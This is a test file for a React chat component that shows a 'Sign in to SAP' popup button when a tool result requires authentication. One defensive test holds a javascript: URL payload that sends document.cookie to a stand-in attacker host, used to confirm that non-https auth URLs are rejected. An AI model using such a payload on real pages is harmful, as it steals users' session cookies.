// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
// SPDX-License-Identifier: Apache-2.0

/**
 * Tests that ToolCallDisplay surfaces an "authentication_required" tool result
 * as a "Sign in to SAP" control that opens a popup (not a new tab).
 */

import { describe, it, expect, afterEach, vi } from "vitest"
import { render, screen, fireEvent, cleanup } from "@testing-library/react"
import { ToolCallDisplay } from "@/components/chat/ToolCallDisplay"

const AUTH_URL =
  "https://bedrock-agentcore.us-east-1.amazonaws.com/identities/oauth2/authorize?request_uri=urn:ietf:params:oauth:request_uri:example"

const authRequiredResult = JSON.stringify({
  success: false,
  message:
    "Authentication required. Please authenticate using the provided URL. Retry once authenticated.",
  data: {
    error_type: "authentication_required",
    requires_user_action: true,
    auth_url: AUTH_URL,
  },
})

describe("ToolCallDisplay — auth-required surfacing", () => {
  afterEach(() => {
    cleanup()
    vi.restoreAllMocks()
  })

  it("opens a popup (not a new tab) at the auth_url when Sign in to SAP is clicked", () => {
    const openSpy = vi.spyOn(window, "open").mockReturnValue(null)
    render(
      <ToolCallDisplay
        name="sap_get_purchase_order"
        args="{}"
        status="complete"
        result={authRequiredResult}
      />
    )

    const button = screen.getByRole("button", { name: /Sign in to SAP/i })
    fireEvent.click(button)

    expect(openSpy).toHaveBeenCalledOnce()
    const [url, target] = openSpy.mock.calls[0]
    expect(url).toBe(AUTH_URL)
    // A named window ("sapAuth"), NOT "_blank" — keeps the workspace tab + chat alive.
    expect(target).toBe("sapAuth")
    expect(screen.getByText(/continues automatically/i)).toBeTruthy()
  })

  it("does not surface auth UI for a normal tool result and still renders the result on expand", () => {
    const normalResult = JSON.stringify({ po_number: "4500001234", amount: 25000 })
    render(
      <ToolCallDisplay
        name="sap_get_purchase_order"
        args="{}"
        status="complete"
        result={normalResult}
      />
    )

    expect(screen.queryByRole("button", { name: /Sign in to SAP/i })).toBeNull()

    expect(screen.queryByText(/4500001234/)).toBeNull()
    fireEvent.click(screen.getByRole("button"))
    expect(screen.getByText(/4500001234/)).toBeTruthy()
  })

  it("treats plain-text (non-JSON) results as normal", () => {
    render(
      <ToolCallDisplay
        name="sap_get_purchase_order"
        args="{}"
        status="complete"
        result="all good"
      />
    )
    expect(screen.queryByRole("button", { name: /Sign in to SAP/i })).toBeNull()
  })

  it("does NOT surface a Sign in control for a non-https auth_url (XSS-sink guard)", () => {
    // auth_url flows into window.open(); a javascript: URL there executes in-origin.
    const malicious = JSON.stringify({
      success: false,
      message: "Authentication required.",
      data: {
        error_type: "authentication_required",
        requires_user_action: true,
        auth_url: "javascript:fetch('https://evil.example/'+document.cookie)",
      },
    })
    render(
      <ToolCallDisplay
        name="sap_get_purchase_order"
        args="{}"
        status="complete"
        result={malicious}
      />
    )
    expect(screen.queryByRole("button", { name: /Sign in to SAP/i })).toBeNull()
  })
})
